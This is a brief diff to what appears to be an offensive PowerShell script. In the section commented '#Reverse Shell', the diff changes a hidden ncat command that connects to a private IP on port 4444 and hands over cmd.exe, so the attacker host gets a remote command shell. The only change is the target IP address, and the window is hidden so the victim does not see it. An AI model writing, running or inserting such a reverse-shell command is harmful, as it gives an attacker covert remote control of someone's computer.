@@ -72,7 +72,8 @@ Start-Process explorer.exe -WindowStyle Minimized
 #Reverse Shell
 Set-Location $env:USERPROFILE
 $Ncat = "C:\Program Files (x86)\Nmap\ncat.exe"
-Start-Process -FilePath $Ncat -ArgumentList "10.93.74.143 4444 -e cmd.exe" -WindowStyle Hidden
+Start-Process -FilePath $Ncat -ArgumentList "10.93.74.204 4444 -e cmd.exe" -WindowStyle Hidden
+
 
 
 
